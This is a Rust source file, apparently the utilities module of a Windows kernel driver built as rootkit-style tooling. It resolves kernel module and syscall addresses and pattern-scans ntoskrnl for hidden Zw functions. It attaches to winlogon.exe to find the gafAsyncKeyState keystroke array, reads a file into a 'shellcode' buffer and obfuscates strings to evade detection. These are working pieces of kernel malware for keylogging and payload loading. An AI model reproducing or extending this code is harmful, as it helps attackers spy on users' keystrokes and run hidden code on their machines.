use {
    crate::{includes::SystemModuleInformation, process::Process}, 
    alloc::{string::String, vec, vec::Vec}, 
    core::{
        ffi::{c_void, CStr}, 
        mem::{size_of, zeroed}, 
        ptr::{null_mut, read},
        fmt::Write
    }, 
    ntapi::{
        ntexapi::{SystemModuleInformation, SystemProcessInformation, PSYSTEM_PROCESS_INFORMATION}, 
        ntzwapi::ZwQuerySystemInformation
    }, 
    ntddk::{ZwCreateFile, ZwQueryInformationFile}, 
    obfstr::obfstr, 
    wdk_sys::{
        *,
        ntddk::{
            ExAllocatePool, ExFreePool, KeStackAttachProcess, KeUnstackDetachProcess, 
            ZwMapViewOfSection, ZwOpenSection, ZwReadFile, ZwClose, ZwUnmapViewOfSection
        },
        _FILE_INFORMATION_CLASS::FileStandardInformation,
        _POOL_TYPE::NonPagedPool, 
        _SECTION_INHERIT::ViewUnmap
    }, 
    winapi::um::winnt::{
        RtlZeroMemory, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, 
        IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER
    },
};

#[cfg(not(test))]
extern crate wdk_panic;

#[cfg(not(test))]
use wdk_alloc::WDKAllocator;

#[cfg(not(test))]
#[global_allocator]
static GLOBAL_ALLOCATOR: WDKAllocator = WDKAllocator;

pub mod macros;
pub mod offsets;
pub mod uni;
pub mod ioctls;

/// Retrieves the input buffer from the given IO stack location.
///
/// # Parameters
/// - `stack`: A pointer to the `_IO_STACK_LOCATION` structure.
///
/// # Returns
/// - `Result<*mut T, NTSTATUS>`: A result containing the pointer to the input buffer or an NTSTATUS error code.
///
pub unsafe fn get_input_buffer<T>(stack: *mut _IO_STACK_LOCATION) -> Result<*mut T, NTSTATUS> {
    let input_buffer = (*stack).Parameters.DeviceIoControl.Type3InputBuffer;
    if input_buffer.is_null() {
        log::error!("Type3InputBuffer is null");
        Err(STATUS_INVALID_PARAMETER)
    } else {
        Ok(input_buffer as *mut T)
    }
}

/// Retrieves the output buffer from the given IRP.
///
/// # Parameters
/// - `irp`: A pointer to the `IRP` structure.
///
/// # Returns
/// - `Result<*mut T, NTSTATUS>`: A result containing the pointer to the output buffer or an NTSTATUS error code.
///
pub unsafe fn get_output_buffer<T>(irp: *mut IRP) -> Result<*mut T, NTSTATUS> {
    let output_buffer = (*irp).UserBuffer;
    if output_buffer.is_null() {
        log::error!("UserBuffer is null");
        Err(STATUS_INVALID_PARAMETER)
    } else {
        Ok(output_buffer as *mut T)
    }
}

/// Gets the base address of a specified module.
///
/// # Parameters
/// - `module_name`: A string slice containing the name of the module.
///
/// # Returns
/// - `Option<*mut c_void>`: An optional pointer to the base address of the module, or None if the module is not found.
///
pub unsafe fn get_module_base_address(module_name: &str) -> Option<*mut c_void> {
    let mut return_bytes = 0;
    ZwQuerySystemInformation(SystemModuleInformation, null_mut(), 0, &mut return_bytes);

    let info_module = ExAllocatePool(NonPagedPool, return_bytes as u64) as *mut SystemModuleInformation;

    if info_module.is_null() {
        log::error!("ExAllocatePool Failed");
        return None;
    }

    RtlZeroMemory(info_module as *mut winapi::ctypes::c_void, return_bytes as usize);

    let status = ZwQuerySystemInformation(
        SystemModuleInformation,
        info_module as *mut winapi::ctypes::c_void, 
        return_bytes, 
        &mut return_bytes
    );
    if !NT_SUCCESS(status) {
        log::error!("ZwQuerySystemInformation [2] Failed With Status: {status}");
        return None;
    }

    let module_count = (*info_module).modules_count;

    for i in 0..module_count as usize {
        let name = (*info_module).modules[i].image_name;
        let module_base = (*info_module).modules[i].image_base as *mut c_void;
        if let Ok(name_str) = core::str::from_utf8(&name) {
            if name_str.contains(module_name) {
                return Some(module_base);
            }
        }
    }

    None
}

/// Gets the address of a specified function within a module.
///
/// # Parameters
/// - `function_name`: A string slice containing the name of the function.
/// - `dll_base`: A pointer to the base address of the DLL.
///
/// # Returns
/// - `Option<*mut c_void>`: An optional pointer to the function's address, or None if the function is not found.
///
pub unsafe fn get_function_address(function_name: &str, dll_base: *mut c_void) -> Option<*mut c_void> {
    let dos_header = dll_base as *mut IMAGE_DOS_HEADER;
    let nt_header = (dll_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let export_directory = (dll_base as usize + (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let names = (dll_base as usize + (*export_directory).AddressOfNames as usize) as *const u32;
    let ordinals = (dll_base as usize + (*export_directory).AddressOfNameOrdinals as usize) as *const u16;
    let addresss = (dll_base as usize + (*export_directory).AddressOfFunctions as usize) as *const u32;

    for i in 0..(*export_directory).NumberOfNames as isize {
        let name = CStr::from_ptr((dll_base as usize + *names.offset(i) as usize) as *const i8).to_str().ok()?;
        let ordinal = *ordinals.offset(i);
        let address = (dll_base as usize + *addresss.offset(ordinal as isize) as usize) as *mut c_void;
        if name == function_name {
            return Some(address);
        }
    }
    
    None
}

/// Get the address of the `gafAsyncKeyState` array within a module in the context of a target process.
///
/// # Parameters
/// - `name`: A string slice containing the name `gafAsyncKeyState`.
/// - `dll_base`: A pointer to the base address of the DLL.
///
/// # Returns
/// - `Option<*mut c_void>`: An optional pointer to the function's address, or None if the function is not found.
///
pub unsafe fn get_address_asynckey(name: &str, dll_base: *mut c_void) -> Option<*mut c_void> {
    let mut apc_state: KAPC_STATE = core::mem::zeroed(); 
    let pid = match get_process_by_name(obfstr!("winlogon.exe")) {
        Some(p) => p,
        None => return None
    };

    let target = match Process::new(pid) {
        Some(p) => p,
        None => return None
    };

    KeStackAttachProcess(target.e_process, &mut apc_state);

    let dos_header = dll_base as *mut IMAGE_DOS_HEADER;
    let nt_header = (dll_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let export_directory = (dll_base as usize + (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let names = (dll_base as usize + (*export_directory).AddressOfNames as usize) as *const u32;
    let ordinals = (dll_base as usize + (*export_directory).AddressOfNameOrdinals as usize) as *const u16;
    let addresss = (dll_base as usize + (*export_directory).AddressOfFunctions as usize) as *const u32;

    for i in 0..(*export_directory).NumberOfNames as isize {
        let name_module = CStr::from_ptr((dll_base as usize + *names.offset(i) as usize) as *const i8).to_str().ok()?;
        let ordinal = *ordinals.offset(i);
        let address = (dll_base as usize + *addresss.offset(ordinal as isize) as usize) as *mut c_void;
        if name_module == name {
            KeUnstackDetachProcess(&mut apc_state);
            return Some(address);
        }
    }

    KeUnstackDetachProcess(&mut apc_state);
    
    None
}

/// Retrieves the PID of a process by its name.
///
/// # Parameters
/// - `process_name`: A string slice containing the name of the process.
///
/// # Returns
/// - `Option<usize>`: An optional containing the PID of the process, or None if the process is not found.
///
pub unsafe fn get_process_by_name(process_name: &str) -> Option<usize> {
    let mut return_bytes = 0;
    ZwQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_bytes);
    let infor_process = ExAllocatePool(NonPagedPool, return_bytes as u64) as PSYSTEM_PROCESS_INFORMATION;
    if infor_process.is_null() {
        log::error!("ExAllocatePool Failed");
        return None;
    }

    let status = ZwQuerySystemInformation(
        SystemProcessInformation,
        infor_process as *mut winapi::ctypes::c_void,
        return_bytes,
        &mut return_bytes,
    );
    if !NT_SUCCESS(status) {
        log::error!("ZwQuerySystemInformation Failed With Status: {status}");
        return None;
    }

    let mut process_info = infor_process;

    loop {
        if !(*process_info).ImageName.Buffer.is_null() {
            let image_name = core::slice::from_raw_parts(
                (*process_info).ImageName.Buffer,
                ((*process_info).ImageName.Length / 2) as usize,
            );
            let name = String::from_utf16_lossy(image_name);
            if name == process_name {
                let pid = (*process_info).UniqueProcessId as usize;
                ExFreePool(infor_process as *mut _);
                return Some(pid);
            }
        }

        if (*process_info).NextEntryOffset == 0 {
            break;
        }

        process_info = (process_info as *const u8).add((*process_info).NextEntryOffset as usize) as PSYSTEM_PROCESS_INFORMATION;
    }

    ExFreePool(infor_process as _);
    None
}

pub unsafe fn get_syscall_index(function_name: &str) -> Option<u16> {
    let mut section_handle = null_mut();
    let ntdll = crate::utils::uni::str_to_unicode("\\KnownDlls\\ntdll.dll");
    let mut obj_attr = OBJECT_ATTRIBUTES {
        ObjectName: &mut ntdll.to_unicode(),
        SecurityDescriptor: null_mut(),
        SecurityQualityOfService: null_mut(),
        RootDirectory: null_mut(),
        Attributes: OBJ_CASE_INSENSITIVE,
        Length: size_of::<OBJECT_ATTRIBUTES>() as u32
    };

    let mut status = ZwOpenSection(&mut section_handle, SECTION_MAP_READ | SECTION_QUERY, &mut obj_attr);
    if !NT_SUCCESS(status) {
        log::error!("ZwOpenSection Failed With Status: {status}");
        return None
    }

    let mut large: LARGE_INTEGER = zeroed();
    let mut ntdll_addr = null_mut();
    let mut view_size = 0;
    status = ZwMapViewOfSection(
        section_handle, 
        0xFFFFFFFFFFFFFFFF as *mut core::ffi::c_void, 
        &mut ntdll_addr, 
        0, 
        0, 
        &mut large, 
        &mut view_size, 
        ViewUnmap, 
        0,
        PAGE_READONLY,
    );
    if !NT_SUCCESS(status) {
        log::error!("ZwMapViewOfSection Failed With Status: {status}");
        ZwUnmapViewOfSection(0xFFFFFFFFFFFFFFFF as *mut c_void, ntdll_addr as *mut c_void);
        ZwClose(section_handle);
        return None
    }

    let dos_header = ntdll_addr as *mut IMAGE_DOS_HEADER;
    let nt_header = (ntdll_addr as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;

    let ntdll_addr = ntdll_addr as usize;
    let export_directory = (ntdll_addr + (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let names = (ntdll_addr + (*export_directory).AddressOfNames as usize) as *const u32;
    let ordinals = (ntdll_addr + (*export_directory).AddressOfNameOrdinals as usize) as *const u16;
    let addresss = (ntdll_addr + (*export_directory).AddressOfFunctions as usize) as *const u32;

    for i in 0..(*export_directory).NumberOfNames as isize {
        let name_module = CStr::from_ptr((ntdll_addr + *names.offset(i) as usize) as *const i8).to_str().ok()?;
        let ordinal = *ordinals.offset(i);
        let address = (ntdll_addr + *addresss.offset(ordinal as isize) as usize) as *const u8;
        if name_module == function_name {

            if read(address) == 0x4C
                && read(address.add(1)) == 0x8B
                && read(address.add(2)) == 0xD1
                && read(address.add(3)) == 0xB8
                && read(address.add(6)) == 0x00
                && read(address.add(7)) == 0x00 
            {
                let high = read(address.add(5)) as u16;
                let low = read(address.add(4)) as u16;
                let ssn = (high << 8) | low;

                ZwUnmapViewOfSection(0xFFFFFFFFFFFFFFFF as *mut c_void, ntdll_addr as *mut c_void);
                ZwClose(section_handle);
                return Some(ssn);
            }
        }
    }

    ZwUnmapViewOfSection(0xFFFFFFFFFFFFFFFF as *mut c_void, ntdll_addr as *mut c_void);
    ZwClose(section_handle);
    return None
}

///
/// 
/// 
/// 
/// 
pub unsafe fn find_zw_function(name: &str) -> Option<usize> {
    let ssn = match get_syscall_index(name) {
        Some(ssn) => ssn,
        None => return None,
    };
    let ntoskrnl_addr = match get_module_base_address(obfstr!("ntoskrnl.exe")) {
        Some(addr) => addr,
        None => return None,
    };

    let ssn_bytes = ssn.to_le_bytes();
    let pattern = [
        0x48, 0x8B, 0xC4,									// mov rax, rsp
        0xFA,												// cli
        0x48, 0x83, 0xEC, 0x10,								// sub rsp, 10h
        0x50,												// push rax
        0x9C,												// pushfq
        0x6A, 0x10,											// push 10h
        0x48, 0x8D, 0x05, 0xCC, 0xCC, 0xCC, 0xCC,			// lea rax, KiServiceLinkage
        0x50,												// push rax
        0xB8, ssn_bytes[0], ssn_bytes[1], 0xCC, 0xCC,		// mov eax, <SSN>
        0xE9, 0xCC, 0xCC, 0xCC, 0xCC						// jmp KiServiceInternal
    ];
    
    let dos_header = ntoskrnl_addr as *mut IMAGE_DOS_HEADER;
    let nt_header = (ntoskrnl_addr as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
    let section_header = (nt_header as usize + size_of::<IMAGE_NT_HEADERS64>()) as *mut IMAGE_SECTION_HEADER;

    for i in 0..(*nt_header).FileHeader.NumberOfSections as usize {
        let section = (*section_header.add(i)).Name;
        let name = core::str::from_utf8(&section).unwrap().trim_matches('\0');
        
        if name == obfstr!(".text") {
            let text_start = ntoskrnl_addr as usize + (*section_header.add(i)).VirtualAddress as usize;
            let text_end = text_start + *(*section_header.add(i)).Misc.VirtualSize() as usize;
            let data = core::slice::from_raw_parts(text_start as *const u8, text_end - text_start);

            if let Some(offset) = data.windows(pattern.len())
                .position(|window| {
                    window.iter().zip(&pattern).all(|(d, p)| *p == 0xCC || *d == *p)
                }) {
                
                return Some(text_start + offset);
            }
        }
    }

    return None
}

/// 
///
///
/// 
#[allow(non_snake_case)]
pub fn InitializeObjectAttributes(
    object_name: Option<*mut UNICODE_STRING>,
    attributes: u32,
    root_directory: Option<*mut c_void>,
    security_descriptor: Option<*mut c_void>,
    security_quality_of_service: Option<*mut c_void>
) -> OBJECT_ATTRIBUTES {
    OBJECT_ATTRIBUTES {
        Length: size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: root_directory.unwrap_or(null_mut()),
        ObjectName: object_name.unwrap_or(null_mut()),
        Attributes: attributes,
        SecurityDescriptor: security_descriptor.unwrap_or(null_mut()),
        SecurityQualityOfService: security_quality_of_service.unwrap_or(null_mut())
    }
}

///
/// 
/// 
/// 
/// 
pub fn read_file(path: &String) -> Result<Vec<u8>, NTSTATUS> {
    let mut path_nt = String::new();
    write!(&mut path_nt, "\\??\\{}", path).unwrap();

    let file_name = crate::utils::uni::str_to_unicode(&path_nt);
    let mut io_status_block: _IO_STATUS_BLOCK = unsafe { zeroed() };
    let mut obj_attr = InitializeObjectAttributes(
        Some(&mut file_name.to_unicode()), 
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 
        None, 
        None, 
        None
    );

    let mut h_file: HANDLE = null_mut();
    let mut status = unsafe { 
        ZwCreateFile(
            &mut h_file,
            GENERIC_READ,
            &mut obj_attr,
            &mut io_status_block,
            null_mut(),
            FILE_ATTRIBUTE_NORMAL,
            0,
            FILE_OPEN,
            FILE_SYNCHRONOUS_IO_NONALERT,
            null_mut(),
            0,
        )
    };
    if !NT_SUCCESS(status) {
        log::error!("ZwCreateFile Failed With Status: {status}");
        unsafe { ZwClose(h_file) };
        return Err(status);
    }

    let mut file_info: FILE_STANDARD_INFORMATION = unsafe { zeroed() };
    status = unsafe { 
        ZwQueryInformationFile(
        h_file, 
        &mut io_status_block, 
        &mut file_info as *mut _ as *mut c_void, 
        size_of::<FILE_STANDARD_INFORMATION>() as u32, 
        FileStandardInformation
        )
    };
    if !NT_SUCCESS(status) {
        log::error!("ZwQueryInformationFile Failed With Status: {status}");
        unsafe { ZwClose(h_file) };
        return Err(status);
    }

    let file_size = unsafe { file_info.EndOfFile.QuadPart as usize };
    let mut byte_offset: LARGE_INTEGER = unsafe { zeroed() };
    byte_offset.QuadPart = 0;
    let mut shellcode = vec![0u8; file_size];
    status = unsafe { 
        ZwReadFile(
            h_file,
            null_mut(),
            None,
            null_mut(),
            &mut io_status_block,
            shellcode.as_mut_ptr() as *mut c_void,
            file_size as u32,
            &mut byte_offset,
            null_mut()
        )
    };
    if !NT_SUCCESS(status) {
        log::error!("ZwReadFile Failed With Status: {status}");
        unsafe { ZwClose(h_file) };
        return Err(status);
    }

    unsafe { ZwClose(h_file) };

    return Ok(shellcode)
}

/// Validates if the given address is within the kernel memory range.
///
/// # Parameters
/// - `addr`: A 64-bit unsigned integer representing the address to validate.
///
/// # Returns
/// - `bool`: True if the address is within the kernel memory range, False otherwise.
/// 
#[allow(dead_code)]
pub fn valid_kernel_memory(addr: u64) -> bool {
    addr > 0x8000000000000000 && addr < 0xFFFFFFFFFFFFFFFF
}